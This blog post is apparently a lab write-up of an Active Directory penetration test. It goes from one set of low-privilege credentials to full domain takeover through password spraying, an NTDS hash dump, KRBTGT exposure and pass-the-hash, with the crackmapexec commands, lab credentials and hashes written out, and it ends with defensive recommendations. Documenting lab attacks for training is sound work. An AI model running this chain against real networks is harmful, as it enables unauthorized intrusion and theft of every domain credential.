---
layout: post
title: "Active Directory Domain Compromise: From Valid Credentials to Full Domain Takeover"
date: 2026-07-21 23:50:00 +0400
---

## Introduction

This lab is from [HackSmarter](https://www.hacksmarter.org/courses/8da0b008-7692-4c3f-a861-b7a02a536e7b/take), simulating an Active Directory penetration test against a Windows Domain Controller. I started with one set of valid low-privilege credentials and ended with full domain compromise.

Along the way I:

- Enumerated domain users and computers
- Found a password reuse issue between two accounts
- Escalated to administrative access on the Domain Controller
- Dumped the full AD password database (NTDS)
- Extracted the KRBTGT hash
- Authenticated as Administrator via Pass-the-Hash — no plaintext password needed

**Domain:** `DRY.MARTINI.BARS` · **DC:** `DC01` (`10.1.221.180`) · **Starting creds:** `ATHENA_SVC` / `1dirtymartini`

---

## 1. Initial LDAP Enumeration

Validated the credentials and pulled a list of domain users.

```bash
nxc ldap 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --users
```

Found: `Administrator`, `Guest`, `krbtgt`, `mprice`, `athena.t0`, `ATHENA_SVC`.

![Valid credentials and domain user list from LDAP enumeration](/assets/images/img1.png)

## 2. Enumerating Domain Computers

```bash
nxc ldap 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --query "(objectClass=computer)" ""
```

Found `DC01` and `EVILPC` — `DC01` was the primary target.

![Domain computer objects DC01 and EVILPC](/assets/images/img2.png)

## 3. SMB Share Enumeration

```bash
nxc smb 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --shares
```

Shares: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `notes`, `SYSVOL`. `ATHENA_SVC` had **READ/WRITE** on `notes` — a potential foothold on its own.

![SMB share listing showing notes share with READ/WRITE](/assets/images/img3.png)

## 4. Password Reuse — the turning point

Built a user list from Step 1 and sprayed the known password across the subnet:

```bash
crackmapexec smb 10.1.221.0/24 -u users.txt -d DRY.MARTINI.BARS -p '1dirtymartini'
```

Hit:

```
DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```

`athena.t0` reused the service account's password — and had admin rights on the DC.

![Password spray hit showing athena.t0 Pwn3d](/assets/images/img4.png)

## 5. Confirming Administrative Access

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --shares
```

```
ADMIN$   READ,WRITE
C$       READ,WRITE
```

![Admin shares ADMIN and C with read write access](/assets/images/img5.png)

## 6. Proving Remote Command Execution

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' -x "whoami"
```

```
dry\athena.t0
```

Domain Controller compromised with admin privileges.

![Whoami output confirming execution as athena.t0](/assets/images/img6.png)

## 7. Extracting AD Password Hashes (NTDS)

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --ntds
```

Dumped hashes for every account: `Administrator`, `krbtgt`, `mprice`, `athena.t0`, `ATHENA_SVC`, `DC01$`, `EVILPC$`.

![NTDS dump showing full account list and hashes](/assets/images/img7.png)

## 8. Obtaining the KRBTGT Hash

```
krbtgt:502
22ebc290e67668629c8d0812662a9c51
```

This hash can forge Kerberos tickets (Golden Tickets) — persistence that survives individual password resets.

![KRBTGT account hash highlighted in NTDS dump](/assets/images/img8.png)

## 9. Pass-the-Hash to Administrator

Used the Administrator NT hash directly, no plaintext needed:

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS
```

```
DRY.MARTINI.BARS\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
```

![Pass the hash authentication as Administrator Pwn3d](/assets/images/img9.png)

Confirmed with execution:

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS -x "whoami"
```

```
dry\administrator
```

![Whoami output confirming execution as domain administrator](/assets/images/img10.png)

---

## Attack Path

```
ATHENA_SVC creds → LDAP enum → password reuse → athena.t0 admin
→ NTDS dump → KRBTGT exposed → Pass-the-Hash → Administrator
```

## Troubleshooting

- **BloodHound collection failed** — LDAP signing was enforced, blocking unsigned collection.
- **`smbclient` share access failed** with just the hash — it expects a password, not an NT hash; needed a hash-aware tool instead.

## Security Impact

Weak password hygiene and password reuse between a service account and a privileged account, combined with excessive admin rights, let one compromised credential lead to full domain compromise: DC admin access, every password hash in the domain, and exposure of KRBTGT.

## Recommendations

- Enforce unique passwords across all accounts
- Reduce unnecessary administrative privileges
- Monitor for abnormal SMB auth activity, especially spray patterns
- Use gMSA for service accounts instead of static passwords
- Enable MFA for privileged accounts
- Regularly audit AD permissions and group memberships
